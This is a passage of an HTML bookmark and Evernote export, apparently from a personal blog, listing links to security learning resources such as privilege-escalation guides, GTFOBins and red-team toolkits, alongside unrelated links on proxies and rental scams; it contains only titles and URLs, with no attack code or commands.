icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACBklEQVQ4jaVTTWsTURQ99840sbEDYWjeQCgSSWjIewERP3BlwV3XblwI9QcIde3G3+AfsGv32bjtQrq3TTqVbNwIzSRDlSzSvHnXhTM6hrgQDzy4vHvuuefexwP+E7TmztNaPyMiJSIWgBBRzTl3MhqNjvMaKcj+iph0u10jIk1r7RERVay1dmNjo8bMLwCcAFiWu5UFBACY+QERnV5cXCRlojHmqtfrPcpd/LZbBK1Wq95sNg+IKFgsFh/SNJ3nrggAKaWuRORJFEU6CIJxmqYLAOBiD5ubmzvMfNc5NxiPx5clVwJAzs7Ohsw8AHC/UqncKsb+5SBJkkul1BciOtje3q4kSfI5bwAA0Fo/J6I959zR+fn56Zrl/0S73VZa69fl/TQajS2t9RsAlVU+r8ae520BuNPpdGpFIgiCkJlNvV6vrdZ5JQHp9/s9Zn4KYBnH8aBIpGk6bzQaj4Mg2FFKfZ9MJpd/CERRdLPVar10zvUAfMyy7P10Or0ui4dheExElL/EQ2b+NJ/PlwDA/X7/UGu9/9fFrEBrvW+MeQWAvd3d3dsA7o1Go3edTqcahqE/m804n7N8PGOMr5TyhsNhrJTai6LoK7XbbVWtVg9F5BszCwCISMbM6/4JnHMQESKiuu/7bwuSb4y54XmeZFlGAGCtXSvg+75YaymO4wWA63Wcf8IPXh+2Al/AzGAAAAAASUVORK5CYII=" target="_blank" rel="noopener">免费ss/ssr分享 | 刘伟</a><br>            <dt><a href="https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/" add_date="1536041620" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Abusing the COM Registry Structure (Part 2): Hijacking &amp; Loading Techniques – | bohops |</a><br>            <dt><a href="http://touhidshaikh.com/blog/?p=790" add_date="1536414413" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACFUlEQVQ4ja2SS08TYRSGn2/ma6fN2FLbcFOJYFK5VEWNMSGBuDNx5cKtCzb+AsMPcGPCyoUuXJtAdGuiGEnUGAgGWkiJ5SaXtoHSIgHpAC12Zj4XRAxR2OC7OzknT973zRFAgRNIAOokAHlSwCEHQgiEEH+2SuGq4/n/JcKBzjfUcykWxfB6KZXK5NfWmZ1Ls1sqHw34bbmz4xoPuu/hNSS67kEpl8ApkydPX/D+wwiapuG67t+AZDJJqbTL4swXKnvbtF7uou5MIz09D8nn0qytbwKgjuhCBgJBYrE2VpYSWMU9PB6JpuksLi0zNDRycHgUQBiGoeLxOKqyycToRwy/n/JehUx2leTkNAODw5SO68C2KziOy5WrnQy8G2Q5O05bS5TW5iaut7cQiYToe/WGhrN1AKysriF1ndqaCIbhRWqajuPYCCFIpjL0973EZxjc6rpB9/27NEcbuXO7i3R6maK1Q8fNdoIBk8/DCUKhINp+Ppe5qVHCVTqRcBUIheM4SCkpl39yOhTEth1y+e9MpuaorYmwtWXxbT6D8Hg8amxslHw2SWE1g99vUrEdTNOPbds8e95POpvjXH0NX2cW0ISg5WITO7tlVnIFhJRSJRIJotEL9D5+xMR4nOrqMMXiNqmZBaamFwAIBkyk1Nn8YaGUIhyuwq7Y+59oWRY+n8nsfI7Xbz/9s+2itXNo3tjYAuAXsOLerSceLTwAAAAASUVORK5CYII=" target="_blank" rel="noopener">Abusing SUDO (Linux Privilege Escalation) - Touhid M.Shaikh</a><br>            <dt><a href="https://gtfobins.github.io/" add_date="1536454300" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAB5ElEQVQ4jaWTsWtUQRDGf/Nudy9e6pAU4YgHAcVOiCQRhBAChhR2NvkvLK1SWd5/IYEUgoVocxGClwsqYhMucKIgV8WAhcmZ2333xuLtcs9WBx7Dzs43O/O9+QQogOvoJXoHKBAozcY7D2TxLgNmAK6AB8ASsAw0gXdAG1iMXzvGmjFnKWKuTKz2FRgytefAl0rsNTAAvldyckCz2NpM9ABZ37mNgTErKXNgzErfuY3YNlWMiYEC0AOoDcGdqz4y0NgDA3AO67nqVhvqi+AfwyRiEGAE3AG+HTv3RlTXfovUBbSmOgKYiDQU5IbqWEV6694/BG4Cp4kDoezvkxEZXatuZyI/aiInscPVieqcFenkcFYZQwEugVaFHI6svehau5/OXWv3j6y94G9rAZcZ/2mGKfucOPfMwK1fqrMqcr/r3AHApBxh9qNzL3I4W/X+aRojFVCAAu4G1TUVkQLmJqqbEEkUkaC6qSKNCFZA0loKwND7nV4ICzVVcUXROQxh/jCEeVcUnZqq9EJYGHq/k14HNO1BBkj8v+O+yEuj+nmv3DZ24TgXGT2BMVPNZIkDpRSTxmLFbe/fUq4yAMt5/gH4GcFUMYmDVixmKV/ZBd4D/QjYBu4Br4A6pUqbgCT5/rOc/wDffcNOqak+VgAAAABJRU5ErkJggg==" target="_blank" rel="noopener">GTFOBins</a><br>            <dt><a href="https://linux-audit.com/" add_date="1535906504" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACIUlEQVQ4jaWTwUtUURSHv3PvHWfS1MICcVfZIt6m8VERQRltWkZgLYIWSUFtol2rUKhFy+ivaFULKQjapDmJDDRNr1DDsNAkTE2bYeY9554W6lg5m+gsDz8++H7nXvjPkUbLvr4+OzMzs8vEcav3TX9kNK3inFvO5XKLjQDmWE/PUa/Sj+E40I5uy1hBn5aq1etRFMVuc9vb2+tKq6tXvTKAsOiVoRgzqaq1Oh0jRtRUlYkPUZQA1AGllZXzIPcEfbxcS9+ZaM1Z4BxCuq5rmMIzi6cDEAEVgGw2u9eJeQb6LZ0kl0aKxSU9xWk8D4E0oIAFRhEKKPspc1PyJA7AWnsEr93A4EixuKRgWOAVnZyhgiXDukaFMm3E1HAyzJaCqB5CWP2OFPQkWTy3EZpIUAxCwhNgCsNZatyX55Q21dcBHqeCTzSzhiIIFsGiKGDwGARBMH+f3AGo6CeQtk7K3TLMS4ULBDg62U2MwW8oCG+ZJdGQZslTrgPWVMdSIgvemMtBELyWKIp1DyeIeQBksL+V2EEBzz4NuSV5EgswPz//o6urq0mUG6mUq861HM4PtHyMMSTAO+ANSgFhFE+EMMcYk4ObZwQIgmBnczpzV6Af4UXi5dFP46aN9zXV9VwKUOtNhR1fp/Mjn7c95TAMm43qRZBrwMGNQrVBb0PlauVKFEVxw88UhmE7cEBEOsR7K2xBFISa/TJeGH8P2+D/Pr8Ahjrk2JKOqpgAAAAASUVORK5CYII=" target="_blank" rel="noopener">Linux Audit - The Linux security blog about Auditing, Hardening, and Compliance</a><br>            <dt><a href="http://vinc.top/category/yjxy/page/2/" add_date="1537065431" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACbklEQVQ4jU1SMUszURDcfXc+JXjnJZyJSFTQ6IWgFkosUghp7FSwtlCs/QV21vkhFrGxtLBQsJAciESwCGisRBL0jGDu3tu3Fscn39SzOzszC0SklCIiZo6i6Ozs7ODgoN1uG2PiOCYiIjL/wMygtSair6+vRqMRBAEAAMDR0REzD4fDOI6VUuY/QJIkRLS3t5dSpZRSSs/zXl5emJmZUx1mThWsk5MT27allOfn50IIpRQiGmMymQwzNxqNfr+/trZGRIgIAKiUAgDbtvf395vNZi6Xs217bGyMmTc3N3d3d2u1mud5qb4QwmZmIQQAHB4e3t7eSimDICiVSvV63ff9paWlXC4HAEopZkZETJIkiqLT09Pn52djzM7OzszMTKVSabVaxph8Pj83N+c4ju/7AGCMQWPM+/v7w8NDoVC4vLxcX1/3PA8RW61WGIaO45TL5a2tLcuyfn5+isUiaq2FEIh4f3/f6XSmp6cR8e7urt/vFwqFSqWysrLi+/7Nzc319fXx8bENAEQkhBgZGSGiWq3W6XRWV1eXl5dd1318fLQsCwDiOM5kMuPj4yL1zszz8/ODwaDdbqeOJycnwzB0XTebzXa73cFgUK/XhRCYBmyMEUJ8fHw0m03P81zXDcNQKVWtVhcXF6MoKpfLSZJMTEygMSbNOM1Xa31xcUFET09PxWLRdd2pqakgCHzfT4u3/9Yzc/pnb29v29vbvV5vdnYWAKrVqpRSa42IiCjSOtJpy7K63e739/fV1VU+nx8Oh6VSqdfrGWNSNgDYKRsAEFFrPTo6ms1mFxYWNjY2Xl9fHcf5/PwUQvxd/gs9ZnNtUBGHWAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">应急响应 Archives - 第2页 共2页 - Vinc&#39;s Blog</a><br>            <dt><a href="https://maxkersten.nl/binary-analysis-course/assembly-basics/practical-case-buffer-overflow-0x01/" add_date="1537107878" target="_blank" rel="noopener">实际案例：缓冲区溢出0x01 - 最大Kersten</a><br>        </dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></dt></p></dl><p><br><br>            <dt><a href="https://rmusser.net/docs/Privilege%20Escalation%20&%20Post-Exploitation.html" add_date="1536835188" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAATElEQVQ4jWMMiMhmIAWwoPEdinDqP9A3FV0DXDVEDqsUEzFmIwMmklSj2EAkQPgB093UtoEBm08wrWXBL02yDZgGDWobiIxsRlKTNwA/ih1Z/AWyTQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Privilege Escalation &amp; Post-Exploitation - InfoSec Reference</a><br>        </dt></p></dt></p></dt></p></dl><p><br>        <dt><a href="https://github.com/demonsec666" add_date="1514961339" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">demonsec666</a><br>        <dt><h3 add_date="1536300538" last_modified="1536300582">PWN</h3><br>        <dl><p><br>            <dt><a href="https://www.jianshu.com/p/187b810e78d2" add_date="1536300555" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACz0lEQVQ4jV2ST2hcZRTFf+f7vvfezOuk0cTWaYtVUEGyEhV0oaBQ0uJCpV1lUwuCBSMoLQiiIoJ/KNiCi1hdxC4UBP/gUtCNiOBG3XRRin9qaJPUUs1Mp0ln3nvfd11MI8WzvNx77uGco5VDe/bnLj9Rp3RbAoiNzHlJYhOWEmDIeQPMSWTS+SpVR4JZWADrRkjCpHZH1COsqsbX3qMsB+ewaxsSRjQsK/LbjbDgJLpDw9Kg7/KZ+7Tj5JcW7rgbTWwldHdhdc3Ui28wffQtlOfmpm+V39Z1w2Qm6Gr50L5ksZGfmLTpl9/FYiM/vZ1meYnqz1+xqwO27N1Pfe4s2Z330Px2xuqV81z5/CNZXZsjRchypl46RnNpVZdeOUz1x1mGp39i8NUntB+ZZe3k2/x9/DVsY52r33+j3uJxLCXkHbpwcNbULnFlh9a9D9J+6FHWv/uaiX0HMAlCIP1zGdcuIcuRHP1PP2D4y4+4dkmQc9jGOnE0pL5wjrL1OMpy+p8t4soOFhsUAmk0RHJMvfA6bnIKixGTCCaRRtfo7HmSyYPPs/rcASbnDtOZfYo46CM53JYO1e9n6J16b5yOJSSQGUESMgMYxxUjYftOLEXW3n8HUsPN86+S3TWDihZyjv8qIhEwAwkzGxfGedJwg/yWGW565ghgZDt30/y1AhJcf7aJMB6CpOsLCdcqaZaX6H14DARTR99EeQEpYjdymBEwM4QAI0YhEQd9wq7dbJ17FuUFKtr0P14gXemPlbtgmAnJwpjIkA+4PEd5QW/xBK7dRnkLgDTo4bftoPPEHC5kpMEaOD9WIJCct2btstZ/+BaqkVHXSk0FqTf2p6kpH7uf8oGHrf/FKQ1P/ywVLZOZtPz03tUi+O6wiYm6ElkmyfF/WNOAgKoyipa1suBGTbropDiPseQlVLRMyOxGpzcjDgE5byo75r0HY0lq5v8FS/1LVvsjW/AAAAAASUVORK5CYII=" target="_blank" rel="noopener">PWN入门（从零开始学习PWN） - 简书</a><br>            <dt><a href="http://wiki.ubuntu.org.cn/%E7%94%A8GDB%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F" add_date="1536300582" target="_blank" rel="noopener">用GDB调试程序 - Ubuntu中文</a><br>        </dt></dt></p></dl><p><br>        <dt><a href="https://twitter.com/" add_date="1519134905" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACgElEQVQ4jX1TTYscVRQ9577XVdXd00kclCHJaHCyCGQXyEoIuIq6CQg6O3FiwL0rNwr1FxxEDEFMAtlMyDIE4iaQdSQqutLRxUwy6gTy0d1VXR/3uKgeMWpy4W3uu/fcd949BwCAPDc8KyT+J5fr73o+VUjqX6UEoKULD1/tJfEM4Ikau7l9buE7bChZevD7Ab74VXksC7M3ttb2rwMANhSwyha5DDn94NeP3oxpdoW9ZBEEfDIuYfEy2mrYiudjFmYnmY0+W740PrT16/ATrLLZG7+4/mBfMHxJC4s+eTIDSUCZDbIPNfVNtrpugnZUF7Bs+PHy0ent5UvTt5HfGyCnh1FcAnjEy6mLSAD1QDaqmlru35J+k1hXenj0+Kpl/bfgiiChqtgEeQuCAzhLIgiQBIH00B+Gevr43ftrB67FQwuPTpnFFNXMRTRwN/bSFSbpCgSoeAJI3esJAh40KxnIKQBEZ/qzoX6d2UKiYuwkqaZyNZXPvyKQpLqNOC1SbTMpQ7wLALZztv+bE++grX+h0QFovr7A7kBdToIcaR8Abu++N7wPiAYA9zZHN1CVP5K2BwBy3tWhEaAIAm1LQZ93ggKtU9pP5rRtGwwSxjRA6mh3OBQgSI0NR9HLybXttf3XIRE5/SmZHrw4Ph1D+FTAa/JaBAyAQ3Ib7ut5Obnb1Dq988HC7lzEiq9cefhCUVWpKT1C+gm4L9Ni0+laxpgG9pLQFpNvZnWxtnvupT8BcY9qbGo7njL7iCGcscVBDy2gBlAtoCpc3v7gxfiL7fdH5+emmbP6p5ly2csr1XFHeYLgYcmNsD+A+P1Wv38Hq2z/r3luzedYeS82FJ519RceFTBxSvLCewAAAABJRU5ErkJggg==" target="_blank" rel="noopener">https://twitter.com</a><br>        <dt><a href="https://www.peerlyst.com/posts/resource-infosec-powershell-tools-resources-and-authors" add_date="1529240999" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACOUlEQVQ4jWPcFykhwMHEAAMffvyDcJm5+DhltV/cvszz7wuyLIsABxNcEQMDgwAHE7O2m1JwIaesNgMDgxIDw/fXj1+ubvp0fidUNt2Ql4OF8cOPfxwsjAwMDOJ+hYrx7az8YtfPHNm+esmXTx+U9EwFTP2+8kj9urKbgYGB8VyiFNw6GX1rpZKVP798zIvwvHHlooYwm4ogC4OkVubUTTx8/IsrY/XfHES4XoCDid8xkYGBoSot4tmtyxUWAtFa3O6KnO4c969OSGZgYFBwDLvy+hfThx//EHo0rb59/njxxOFEPV5pXmaI9xgYGDgfn/r26rGtm++hxz+Z4KKQkPny6SMzI4OKIAvcWogs489PDAwMd97/ZkIW/XLzuJi0nL6+AYq1HEw/eKQ5ZbUf3bzMwMDAhGzS+2NrGBgYdOy9vv7+j2ytbtEcBgaGrauXSPEysyCb9O33fwYGBmVNXTmHVZyvbzw7tUNc10rQKpRNWObRzcsr5kwJ1eBmhMe0uF+huG8hAwPDl08fefj4GZDA1kXTZve18v3/kqLHC41p3cx+QatQiOr8CI+vrx6rm9gqa+revX75xpWLb589spPlcFfi42RhZGFgYICrZmBgmN5S/urOlRhtHoWfR+7u38/z5a+/CDOPJJ+CANTxLCIuyXDV3WUZO9csidTi1hRh/fDjn44om44oeqJk+vX2CVz1llWLI7W4TSXZkcMaPUL2RUr8ljfbdu/7xROHI7W4VQVZsaZ2OBcAsL/tmnRTUlEAAAAASUVORK5CYII=" target="_blank" rel="noopener">Resource: Infosec PowerShell tools, resources, and authors by Claus Cramon Houmann - twitter, how to, vulnerabilities | Peerlyst</a><br>        <dt><a href="https://www.youtube.com/" add_date="1515587340" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABCElEQVQ4ja2TMU4DMRBF38wiEFIqKFYIUSAtJ8kNcoood8jJopwgRyANNCg1aSJl/Sls73rdoBC+NLI982c8/raNAgIHLC2NKZRHg1BHavKvyDlWOGbAG9ACT8RuSgTgCzgA7wbHstpC8Ck4CSSQzDTMp3ZK3EVOvhN8pGAvCILzYGbnYh0SRynn1oEX4JGpME7bOmaO5Lh7daQAPADPDtwnLSKhaaI2q5Wx2RhdZ4RgTIXOBWde7WyYRWLfw3wOux2s12PhaaFQK30xbqqzCSnu1DSw3cJyCfv9GI+Wu3AEneCY1M23ENS2QWZx7h4G/8j7FrxefY25rz8/pH97ytd/puS8+Dv/AFRGv3m23DwSAAAAAElFTkSuQmCC" target="_blank" rel="noopener">www.youtube.com</a><br>        <dt><a href="https://bohops.com/2018/04/28/abusing-dcom-for-yet-another-lateral-movement-technique/" add_date="1524989362" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Abusing DCOM For Yet Another Lateral Movement Technique – | bohops |</a><br>        <dt><a href="https://github.com/infosecn1nja/Red-Teaming-Toolkit" add_date="1525249049" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">infosecn1nja/Red-Teaming-Toolkit: A collection of open source and commercial tools that aid in red team operations.</a><br>        <dt><a href="https://adsecurity.org/?page_id=1352" add_date="1526861564" target="_blank" rel="noopener">演示文稿 - Active Directory安全性</a><br>        <dt><a href="https://github.com/cujanovic?tab=repositories" add_date="1527158767" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACJElEQVQ4jY1TMWsUQRT+5r3d3Cbe7t3u3hEDdoJgIVieGo1YBixsBIsUtvkHNpaCnaJFUMEihSlEbGxFE8XCRrDWIAqJyd3t3JGcuduZeRa5DUtAk6968/i+733zhlE4hHq9foWZbwG4pkRmAECU2gDw1lr7Qmu9WuarUs2NOH7Onrdw2LQMa8xyO8tuA7BlA07TdM0juvA/cQHj3KdOp3MZgGUAaMTxssc8nxuzOsrzm90s2yDmU6TUtoh0BKhut9t3Rnl+1/O8Mz7z7GSlcnqwt/cKURS1pptNmW42JUmSpfGQKoCp0tBqkTZJkqWCH0VRiyaYFw/uZ+2zcbkDYFAy2AEgAOCcWymaE8yLBOZZALDOjQB0jrGCdevccH9zPEsYPxWU2uz1eutHqbXWP6DUbwCAyAwV0QDUANAxEhBE6uNaSICfAMBK1dI0vX6UOo7jeSaKsD/5F5FSa04EW+22dca8jMPw0r/ESRheZKKnxVlE3lFuzOPRMIeIWN3v93u7ux+IaBBFUasgBkFwlYi2/SD4yEQnSwaPSGv9xa/4T6abzYm6789Vq9WFMAw/K6W2CmKlUtmJoqhRTmNFHmRZ9vXgLyRx/J6IzlnnzotIX2utS/ywkaabTDQFANaY1+0su7G/0TG6WTYHpVaY6LvH/A3ATMngRCE2xtwrxADA5ViDweDNZBDsQamG7/vLw+HwDwDUajVfiZx1wMNOt3u/rPkLJe7aBdfH1TYAAAAASUVORK5CYII=" target="_blank" rel="noopener">cujanovic（PredragCujanović）/存储库</a><br>        <dt><a href="http://house.163.com/17/1018/17/D120VADC000792IT.html" add_date="1528640212" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAcElEQVQ4ja1RQQ7AMAhiS///ZXdyMYisy8bJEoqowEccigwgBnHTN6J+zg+KkwYszHet2WSpqC4ywxpMu9gyCCBqArPYd115rNMJ1A64gYzI59s5ZwN3qu9ar0k0pWDcBkrouMf4KeTo4xKnERz/Cy6pAjoL4fNqsQAAAABJRU5ErkJggg==" target="_blank" rel="noopener">租客自述：豆瓣租房也被骗 如何把黑中介告上法庭_网易房产频道</a><br>        <dt><a href="https://www.douban.com/group/topic/108900749/" add_date="1528669134" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACEUlEQVQ4jXWSv2tTURTHv+fc+/JeEpPXWht/gIJDUWitqKDYbhlEEByqqz8GIYLFzcF/QHBVwcVB6yBIcCoqOhVpEWn9SScpTdyMrSUvNUmbd89xeDGD1jPdA+d87/d+74eCxe0KBUAghRIIgEIJAAhA0vYGrDoFAQoiMAy2KoWIqpICsJBEj1vShLS3XAAHPmcUQiALB0Om7aJz/eev7Lgca8zEPWOiYsk+WHn4bK0cmLyodG8w4i21lp+sPO1o/Je6R3aptWzES15i4aBQS+mPjYWz4ZnR7DBADAYgEEA//1qcqk0FJq9OAFBqro8ABWLp1I5/m43mHn9/FNgQ0HYcXdh5aTw/Vni3z7LXTQkOCgAQcZGLpldflCtlpAAAHQx4uw9lR8Q5aM+SJJkSCacpuLandDgz7JsMgVY3a2PheJrTJEyAKkAwfNEnJShYyWM/YD/gTMg5C5ooTBzMHLhVuf22Pp/MqCqlXvcplIk3XBPNjbtH76+79ZsfbsDgU/HLm7XZyfmr2BakTFpVCGRVlMGxtIsDxaFde4/ljpzsP1FtVgf9wmhuZKH+vjRU+tqqzvycsRwIhLznIRNvxo3J/ddPD56qd+qiEnqhqkRxlGI/a7Ivf7y6V7mTsjlRIW86TNDoxA2I6/KWBNc7s/FsrouGOiWQQnzOE9N/4FPnXMKLJSEoQMm//pH8Z7FH129xZPt0jDwM6gAAAABJRU5ErkJggg==" target="_blank" rel="noopener">租房指南，请务必精读至少一遍。欢迎大家*积极宣传…</a><br>    <dl><p><br></p></dl><p><br><br><br>  ——————–<br>#### 印象笔记收藏的 ####<br>          <html><br><head><meta name="generator" content="Hexo 3.8.0"><br>  <title>Evernote Export</title><br>  <basefont face="微软雅黑" size="2"><br>  <meta http-equiv="Content-Type" content="text/html;charset=utf-8"><br>  <meta name="exporter-version" content="YXBJ Windows/600240 (zh-CN, DDL); Windows/6.1.1 (Win64);"><br>  <style><br>    body, td {<br>      font-family: 微软雅黑;<br>      font-size: 10pt;<br>    }<br>  </style><br></head><br><body><br><a name="459"><br><br><div><span><div><a href="https://github.com/trimstray/awesome-ninja-admins/blob/master/README.md" target="_blank" rel="noopener">https://github.com/trimstray/awesome-ninja-admins/blob/master/README.md</a></div><div><br></div><div><img src="Demon分享_files/20180715-235422.png" type="image/png" data-filename="20180715-235422.png"></div></span><br></div><br><hr><br><a name="489"><br><br><div><span><div><a href="https://pentester.land/newsletter/2018/07/09/the-5-hacking-newsletter-11.html" target="_blank" rel="noopener">https://pentester.land/newsletter/2018/07/09/the-5-hacking-newsletter-11.html</a></div></span><br></div><br><hr><br><a name="493"><br><br><div><br><span><div><a href="https://leotindall.com/tutorial/an-intro-to-x86_64-reverse-engineering/" target="_blank" rel="noopener">https://leotindall.com/tutorial/an-intro-to-x86_64-reverse-engineering/</a></div></span><br></div><br><hr><br><a name="494"><br><br><div><br><span><div><a href="https://github.com/0xdea/tactical-exploitation" target="_blank" 